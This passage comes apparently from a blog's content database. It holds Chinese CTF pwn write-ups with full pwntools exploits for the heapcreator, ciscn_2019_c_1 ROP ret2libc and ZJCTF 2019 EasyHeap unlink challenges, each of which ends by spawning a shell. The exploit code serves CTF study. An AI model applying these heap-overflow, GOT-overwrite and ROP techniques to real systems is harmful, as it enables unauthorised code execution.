class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><span class=\"hljs-comment\">#r = remote(&#x27;node4.buuoj.cn&#x27;,26117)</span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./heapcreator&#x27;</span>)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">add</span>(<span class=\"hljs-params\">size,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;1&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Heap : &quot;</span>,<span class=\"hljs-built_in\">str</span>(size))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap:&quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">edit</span>(<span class=\"hljs-params\">idx,content</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;2&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;heap : &quot;</span>,content)<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">show</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;3&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br><span class=\"hljs-keyword\">def</span> <span class=\"hljs-title function_\">delete</span>(<span class=\"hljs-params\">idx</span>):<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;choice :&quot;</span>,<span class=\"hljs-string\">&#x27;4&#x27;</span>)<br>    r.sendlineafter(<span class=\"hljs-string\">&quot;Index :&quot;</span>,<span class=\"hljs-built_in\">str</span>(idx))<br><br>free_got = elf.got[<span class=\"hljs-string\">&#x27;free&#x27;</span>]<br><br>add(<span class=\"hljs-number\">0x18</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x10</span>,<span class=\"hljs-string\">&quot;MMMM&quot;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-string\">b&#x27;/bin/sh\\x00&#x27;</span>+p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">2</span>+<span class=\"hljs-string\">b&#x27;\\x81&#x27;</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>delete(<span class=\"hljs-number\">1</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>add(<span class=\"hljs-number\">0x70</span>,p64(<span class=\"hljs-number\">1</span>)*<span class=\"hljs-number\">8</span>+p64(<span class=\"hljs-number\">0x8</span>)+p64(free_got))<br>show(<span class=\"hljs-number\">2</span>)<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br><br>free_addr = u64(r.recvuntil(<span class=\"hljs-string\">b&#x27;\\x7f&#x27;</span>)[-<span class=\"hljs-number\">6</span>:].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\x00&#x27;</span>))<br><br><span class=\"hljs-comment\">#libc</span><br>libc = LibcSearcher(<span class=\"hljs-string\">&#x27;free&#x27;</span>,free_addr)<br>offset = free_addr-libc.dump(<span class=\"hljs-string\">&#x27;free&#x27;</span>)<br>system_addr = offset + libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>)<br><br>edit(<span class=\"hljs-number\">2</span>,p64(system_addr))<br><span class=\"hljs-comment\">#gdb.attach(r)</span><br>delete(<span class=\"hljs-number\">0</span>)<br><br>r.interactive()<br></code></pre></td></tr></table></figure>\n\n"},{"title":"ROP ciscn_2019_c_1","date":"2022-11-16T11:07:00.000Z","excerpt":"exp","_content":"\n**题目**\n\n<https://buuoj.cn/challenges#ciscn_2019_c_1>\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\np = process('./ciscn_2019_c_1')\n# p = remote('node4.buuoj.cn',29563) \nelf = ELF('./ciscn_2019_c_1')\n\nret=0x4006b9\nrdi=0x400c83\nmain=elf.sym['main']\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\n#第一次攻击绕过函数\np.sendlineafter(b'Input your choice!\\n',b'1')\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\n \n \n \np.recvline()\t#接收字符串Ciphertext\np.recvline()    #加密后的密文\n#这里注意需要接收2次\n \nputs_addr=u64(p.recvuntil(b'\\n')[:-1].ljust(8,b'\\0'))  #得到 puts 函数 的地址\n\nprint(hex(puts_addr))\n\nlibc=LibcSearcher('puts',puts_addr) #获取libc的版本\noffset=puts_addr-libc.dump('puts') #计算偏移量\nbinsh=offset+libc.dump('str_bin_sh') #计算字符串\"/bin/sh\"的地址\nsystem=offset+libc.dump('system') #计算函数system的地址\n \n#第二次攻击getshell\n \np.sendlineafter(b'Input your choice!\\n',b'1')     #   再一次执行 一遍流程\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\np.interactive()\n\n\n\n# ubuntu18版本以上调用64位程序中的system函数的栈对齐问题\n# https://www.cnblogs.com/ZIKH26/articles/15996874.html\n```","source":"_posts/ctf-pwn/ROP ciscn_2019_c_1.md","raw":"---\ntitle: ROP ciscn_2019_c_1\ntags: [ctf-pwn,exp]\ndate: 2022-11-16 19:07:00\ncategories: [ctf-pwn]\nexcerpt: exp\n---\n\n**题目**\n\n<https://buuoj.cn/challenges#ciscn_2019_c_1>\n\n**Exp**\n\n```python\nfrom pwn import *\nfrom LibcSearcher import *\np = process('./ciscn_2019_c_1')\n# p = remote('node4.buuoj.cn',29563) \nelf = ELF('./ciscn_2019_c_1')\n\nret=0x4006b9\nrdi=0x400c83\nmain=elf.sym['main']\nputs_plt=elf.plt['puts']\nputs_got=elf.got['puts']\n\n#第一次攻击绕过函数\np.sendlineafter(b'Input your choice!\\n',b'1')\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\n \n \n \np.recvline()\t#接收字符串Ciphertext\np.recvline()    #加密后的密文\n#这里注意需要接收2次\n \nputs_addr=u64(p.recvuntil(b'\\n')[:-1].ljust(8,b'\\0'))  #得到 puts 函数 的地址\n\nprint(hex(puts_addr))\n\nlibc=LibcSearcher('puts',puts_addr) #获取libc的版本\noffset=puts_addr-libc.dump('puts') #计算偏移量\nbinsh=offset+libc.dump('str_bin_sh') #计算字符串\"/bin/sh\"的地址\nsystem=offset+libc.dump('system') #计算函数system的地址\n \n#第二次攻击getshell\n \np.sendlineafter(b'Input your choice!\\n',b'1')     #   再一次执行 一遍流程\npayload=b'\\0'+b'a'*(0x50-1+8)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)\np.sendlineafter(b'Input your Plaintext to be encrypted\\n',payload)\np.interactive()\n\n\n\n# ubuntu18版本以上调用64位程序中的system函数的栈对齐问题\n# https://www.cnblogs.com/ZIKH26/articles/15996874.html\n```","slug":"ctf-pwn/ROP ciscn_2019_c_1","published":1,"updated":"2022-12-23T08:29:50.086Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969gf000478uf766seta9","content":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#ciscn_2019_c_1\">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>p = process(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class=\"hljs-comment\"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class=\"hljs-number\">0x4006b9</span><br>rdi=<span class=\"hljs-number\">0x400c83</span><br>main=elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br><br><span class=\"hljs-comment\">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)<br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()\t<span class=\"hljs-comment\">#接收字符串Ciphertext</span><br>p.recvline()    <span class=\"hljs-comment\">#加密后的密文</span><br><span class=\"hljs-comment\">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"hljs-number\">1</span>].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>))  <span class=\"hljs-comment\">#得到 puts 函数 的地址</span><br><br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>,puts_addr) <span class=\"hljs-comment\">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>) <span class=\"hljs-comment\">#计算偏移量</span><br>binsh=offset+libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>) <span class=\"hljs-comment\">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>) <span class=\"hljs-comment\">#计算函数system的地址</span><br> <br><span class=\"hljs-comment\">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)     <span class=\"hljs-comment\">#   再一次执行 一遍流程</span><br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class=\"hljs-comment\"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class=\"hljs-comment\"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>","site":{"data":{}},"more":"<p><strong>题目</strong></p>\n<p><a href=\"https://buuoj.cn/challenges#ciscn_2019_c_1\">https://buuoj.cn/challenges#ciscn_2019_c_1</a></p>\n<p><strong>Exp</strong></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-keyword\">from</span> pwn <span class=\"hljs-keyword\">import</span> *<br><span class=\"hljs-keyword\">from</span> LibcSearcher <span class=\"hljs-keyword\">import</span> *<br>p = process(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><span class=\"hljs-comment\"># p = remote(&#x27;node4.buuoj.cn&#x27;,29563) </span><br>elf = ELF(<span class=\"hljs-string\">&#x27;./ciscn_2019_c_1&#x27;</span>)<br><br>ret=<span class=\"hljs-number\">0x4006b9</span><br>rdi=<span class=\"hljs-number\">0x400c83</span><br>main=elf.sym[<span class=\"hljs-string\">&#x27;main&#x27;</span>]<br>puts_plt=elf.plt[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br>puts_got=elf.got[<span class=\"hljs-string\">&#x27;puts&#x27;</span>]<br><br><span class=\"hljs-comment\">#第一次攻击绕过函数</span><br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)<br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(rdi)+p64(puts_got)+p64(puts_plt)+p64(main)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br> <br> <br> <br>p.recvline()\t<span class=\"hljs-comment\">#接收字符串Ciphertext</span><br>p.recvline()    <span class=\"hljs-comment\">#加密后的密文</span><br><span class=\"hljs-comment\">#这里注意需要接收2次</span><br> <br>puts_addr=u64(p.recvuntil(<span class=\"hljs-string\">b&#x27;\\n&#x27;</span>)[:-<span class=\"hljs-number\">1</span>].ljust(<span class=\"hljs-number\">8</span>,<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>))  <span class=\"hljs-comment\">#得到 puts 函数 的地址</span><br><br><span class=\"hljs-built_in\">print</span>(<span class=\"hljs-built_in\">hex</span>(puts_addr))<br><br>libc=LibcSearcher(<span class=\"hljs-string\">&#x27;puts&#x27;</span>,puts_addr) <span class=\"hljs-comment\">#获取libc的版本</span><br>offset=puts_addr-libc.dump(<span class=\"hljs-string\">&#x27;puts&#x27;</span>) <span class=\"hljs-comment\">#计算偏移量</span><br>binsh=offset+libc.dump(<span class=\"hljs-string\">&#x27;str_bin_sh&#x27;</span>) <span class=\"hljs-comment\">#计算字符串&quot;/bin/sh&quot;的地址</span><br>system=offset+libc.dump(<span class=\"hljs-string\">&#x27;system&#x27;</span>) <span class=\"hljs-comment\">#计算函数system的地址</span><br> <br><span class=\"hljs-comment\">#第二次攻击getshell</span><br> <br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your choice!\\n&#x27;</span>,<span class=\"hljs-string\">b&#x27;1&#x27;</span>)     <span class=\"hljs-comment\">#   再一次执行 一遍流程</span><br>payload=<span class=\"hljs-string\">b&#x27;\\0&#x27;</span>+<span class=\"hljs-string\">b&#x27;a&#x27;</span>*(<span class=\"hljs-number\">0x50</span>-<span class=\"hljs-number\">1</span>+<span class=\"hljs-number\">8</span>)+p64(ret)+p64(rdi)+p64(binsh)+p64(system)<br>p.sendlineafter(<span class=\"hljs-string\">b&#x27;Input your Plaintext to be encrypted\\n&#x27;</span>,payload)<br>p.interactive()<br><br><br><br><span class=\"hljs-comment\"># ubuntu18版本以上调用64位程序中的system函数的栈对齐问题</span><br><span class=\"hljs-comment\"># https://www.cnblogs.com/ZIKH26/articles/15996874.html</span><br></code></pre></td></tr></table></figure>"},{"title":"ZJCTF 2019 EasyHeap","date":"2022-11-29T07:09:00.000Z","excerpt":"unlink 漏洞例题","_content":"\n#### 题目链接\n\n<https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap>\n\n#### 漏洞\n\n很明显在`ceate_heap`中size并没有存下来，然后`edit_heap`时也是用户自己输入size来编辑\n\n因此可以溢出\n\n#### 利用\n\nchecksec发现没有开启PIE，heaparray的地址可以直接使用\n\n1. 首先申请三个chunk\n\n   ```python\n   add(0x90,b\"MMMM\")\n   add(0x90,b\"MMMM\")\n   add(0x20,b\"/bin/sh\\x00\")\n   ```\n\n2. 构造一个unlink需要在第一个chunk内构造一个fakechunk\n\n   ```python\n   fake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\n   fake_chunk = fake_chunk.ljust(0x90,b'M')\n   fake_chunk += p64(0x90) + p64(0xa0)\n   edit(0,0x100,fake_chunk)\n   ```\n\n   ![](/img/[ZJCTF2019]EasyHeap/1.jpg)\n\n   对于chunk 0，`fd = heaparray - 0x18` `bk = heaparray - 0x10`，unlink chunk 0 时会将heaparray[0]指向`heaparray - 0x18`\n\n3. 这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin\n\n   ![](/img/[ZJCTF2019]EasyHeap/2.jpg)\n\n   查看heaparray地址上的值：\n   \n   ![](/img/[ZJCTF2019]EasyHeap/3.jpg)\n   \n   说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8\n   \n4. 这时edit(0)会从0x6020c8这个地址开始写，因此\n\n   ```python\n   payload = p64(0)*3 +p64(free_got)\n   edit(0,0x20 ,payload)\n   ```\n\n   又一次覆盖了heaparray[0]，指向了`free@got`\n\n5. 这时edit(0)会修改`free@got`的内容\n\n   ```python\n   edit(0,8,p64(system_plt))\n   ```\n\n   将其函数改为system函数的plt表\n\n   > 因为system没有被调用过，不能直接改成system@got\n\n6. delete(2)会调用free(\"/bin/sh\")，而free函数被替换成了system，因此得到了shell\n\n#### 完整exp\n\n```python\nfrom pwn import *\nr = remote(\"node4.buuoj.cn\",27679)\nelf = ELF(\"./easyheap\")\ndef add(size,content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('1')\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap:\")\n    r.sendline(content)\ndef edit(idx, size, content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('2')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap : \")\n    r.sendline(content)\ndef delete(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('3')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\nheaparray_addr = 0x6020E0\nsystem_plt = elf.plt['system']\nfree_got = elf.got['free']\n\nadd(0x90,b\"MMMM\")\nadd(0x90,b\"MMMM\")\nadd(0x20,b\"/bin/sh\\x00\")\n#gdb.attach(r)\n\nfake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\nfake_chunk = fake_chunk.ljust(0x90,b'M')\nfake_chunk += p64(0x90) + p64(0xa0)\nedit(0,0x100,fake_chunk)\ndelete(1)\n#gdb.attach(r)\npayload = p64(0)*3 +p64(free_got)\nedit(0,0x20 ,payload)\n#gdb.attach(r)\nedit(0,8,p64(system_plt))\ndelete(2)\nr.interactive()\n```\n\n","source":"_posts/ctf-pwn/[ZJCTF 2019]EasyHeap.md","raw":"---\ntitle: ZJCTF 2019 EasyHeap\ntags: [ctf-pwn,exp]\ndate: 2022-11-29 15:09:00\ncategories: [ctf-pwn]\nexcerpt: unlink 漏洞例题\n---\n\n#### 题目链接\n\n<https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap>\n\n#### 漏洞\n\n很明显在`ceate_heap`中size并没有存下来，然后`edit_heap`时也是用户自己输入size来编辑\n\n因此可以溢出\n\n#### 利用\n\nchecksec发现没有开启PIE，heaparray的地址可以直接使用\n\n1. 首先申请三个chunk\n\n   ```python\n   add(0x90,b\"MMMM\")\n   add(0x90,b\"MMMM\")\n   add(0x20,b\"/bin/sh\\x00\")\n   ```\n\n2. 构造一个unlink需要在第一个chunk内构造一个fakechunk\n\n   ```python\n   fake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\n   fake_chunk = fake_chunk.ljust(0x90,b'M')\n   fake_chunk += p64(0x90) + p64(0xa0)\n   edit(0,0x100,fake_chunk)\n   ```\n\n   ![](/img/[ZJCTF2019]EasyHeap/1.jpg)\n\n   对于chunk 0，`fd = heaparray - 0x18` `bk = heaparray - 0x10`，unlink chunk 0 时会将heaparray[0]指向`heaparray - 0x18`\n\n3. 这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin\n\n   ![](/img/[ZJCTF2019]EasyHeap/2.jpg)\n\n   查看heaparray地址上的值：\n   \n   ![](/img/[ZJCTF2019]EasyHeap/3.jpg)\n   \n   说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8\n   \n4. 这时edit(0)会从0x6020c8这个地址开始写，因此\n\n   ```python\n   payload = p64(0)*3 +p64(free_got)\n   edit(0,0x20 ,payload)\n   ```\n\n   又一次覆盖了heaparray[0]，指向了`free@got`\n\n5. 这时edit(0)会修改`free@got`的内容\n\n   ```python\n   edit(0,8,p64(system_plt))\n   ```\n\n   将其函数改为system函数的plt表\n\n   > 因为system没有被调用过，不能直接改成system@got\n\n6. delete(2)会调用free(\"/bin/sh\")，而free函数被替换成了system，因此得到了shell\n\n#### 完整exp\n\n```python\nfrom pwn import *\nr = remote(\"node4.buuoj.cn\",27679)\nelf = ELF(\"./easyheap\")\ndef add(size,content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('1')\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap:\")\n    r.sendline(content)\ndef edit(idx, size, content):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('2')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n    r.recvuntil(\"Size of Heap : \")\n    r.sendline(str(size))\n    r.recvuntil(\"Content of heap : \")\n    r.sendline(content)\ndef delete(idx):\n    r.recvuntil(\"Your choice :\")\n    r.sendline('3')\n    r.recvuntil(\"Index :\")\n    r.sendline(str(idx))\n\nheaparray_addr = 0x6020E0\nsystem_plt = elf.plt['system']\nfree_got = elf.got['free']\n\nadd(0x90,b\"MMMM\")\nadd(0x90,b\"MMMM\")\nadd(0x20,b\"/bin/sh\\x00\")\n#gdb.attach(r)\n\nfake_chunk = p64(0)+p64(0x91) + p64(heaparray_addr-0x18) + p64(heaparray_addr-0x10)\nfake_chunk = fake_chunk.ljust(0x90,b'M')\nfake_chunk += p64(0x90) + p64(0xa0)\nedit(0,0x100,fake_chunk)\ndelete(1)\n#gdb.attach(r)\npayload = p64(0)*3 +p64(free_got)\nedit(0,0x20 ,payload)\n#gdb.attach(r)\nedit(0,8,p64(system_plt))\ndelete(2)\nr.interactive()\n```\n\n","slug":"ctf-pwn/[ZJCTF 2019]EasyHeap","published":1,"updated":"2022-12-23T08:29:19.960Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clc0969gg000678ufas666ie1","content":"<h4 id=\"题目链接\"><a href=\"#题目链接\" class=\"headerlink\" title=\"题目链接\"></a>题目链接</h4><p><a href=\"https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap\">https://buuoj.cn/challenges#[ZJCTF%202019]EasyHeap</a></p>\n<h4 id=\"漏洞\"><a href=\"#漏洞\" class=\"headerlink\" title=\"漏洞\"></a>漏洞</h4><p>很明显在<code>ceate_heap</code>中size并没有存下来，然后<code>edit_heap</code>时也是用户自己输入size来编辑</p>\n<p>因此可以溢出</p>\n<h4 id=\"利用\"><a href=\"#利用\" class=\"headerlink\" title=\"利用\"></a>利用</h4><p>checksec发现没有开启PIE，heaparray的地址可以直接使用</p>\n<ol>\n<li><p>首先申请三个chunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&quot;MMMM&quot;</span>)<br>add(<span class=\"hljs-number\">0x20</span>,<span class=\"hljs-string\">b&quot;/bin/sh\\x00&quot;</span>)<br></code></pre></td></tr></table></figure></li>\n<li><p>构造一个unlink需要在第一个chunk内构造一个fakechunk</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">fake_chunk = p64(<span class=\"hljs-number\">0</span>)+p64(<span class=\"hljs-number\">0x91</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x18</span>) + p64(heaparray_addr-<span class=\"hljs-number\">0x10</span>)<br>fake_chunk = fake_chunk.ljust(<span class=\"hljs-number\">0x90</span>,<span class=\"hljs-string\">b&#x27;M&#x27;</span>)<br>fake_chunk += p64(<span class=\"hljs-number\">0x90</span>) + p64(<span class=\"hljs-number\">0xa0</span>)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x100</span>,fake_chunk)<br></code></pre></td></tr></table></figure>\n\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/1.jpg\"></p>\n<p>对于chunk 0，<code>fd = heaparray - 0x18</code> <code>bk = heaparray - 0x10</code>，unlink chunk 0 时会将heaparray[0]指向<code>heaparray - 0x18</code></p>\n</li>\n<li><p>这时delete(1)，会将chunk 1 和 fakechunk 合并起来放入 unsorted bin</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/2.jpg\"></p>\n<p>查看heaparray地址上的值：</p>\n<p><img src=\"/img/%5BZJCTF2019%5DEasyHeap/3.jpg\"></p>\n<p>说明fakechunk成功完成unlink操作，heaparray[0]指向了0x6020c8</p>\n</li>\n<li><p>这时edit(0)会从0x6020c8这个地址开始写，因此</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">payload = p64(<span class=\"hljs-number\">0</span>)*<span class=\"hljs-number\">3</span> +p64(free_got)<br>edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">0x20</span> ,payload)<br></code></pre></td></tr></table></figure>\n\n<p>又一次覆盖了heaparray[0]，指向了<code>free@got</code></p>\n</li>\n<li><p>这时edit(0)会修改<code>free@got</code>的内容</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\">edit(<span class=\"hljs-number\">0</span>,<span class=\"hljs-number\">8</span>,p64(system_plt))<br></code></pre></td></tr></table></figure>\n\n<p>将其函数改为system函数的plt表</p>\n<blockquote>\n<p>因为system没有被调用过，不能直接改成system@got</p>\n</blockquote>\n</li>\n<li><p>delete(2)会调用free(“/bin/sh”)，而free函数被替换成了system，因此得到了shell</p>\n</li>\n</ol>\n<h4 id=\"完整exp\"><a href=\"#完整exp\" class=\"headerlink\" title=\"完整exp\"></a>完整exp</h4><figure class=\"highlight 